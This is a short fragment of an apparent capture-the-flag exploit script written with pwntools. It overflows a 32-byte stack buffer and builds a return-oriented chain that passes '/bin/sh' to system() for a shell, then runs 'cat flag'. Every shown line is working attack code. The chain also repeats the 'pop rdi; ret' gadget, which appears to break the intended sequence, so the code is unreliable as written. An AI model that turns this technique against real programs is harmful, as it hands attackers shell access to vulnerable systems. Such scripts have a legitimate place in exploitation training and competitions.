26:payload = b'A' * 40  # 32 bytes buffer + 8 bytes RBP
27:payload += p64(pop_rdi)  # Return address - pop rdi; ret
28:payload += p64(pop_rdi)  # Return address - pop rdi; ret
29:payload += p64(binsh_addr)  # Address of "/bin/sh" to be popped into RDI
30:payload += p64(system_addr)  # Call system
31:# Send the payload
32:p.sendline(payload)
33:log.info(f"Payload sent: {payload.hex()}")
34:p.sendline(b'cat flag')
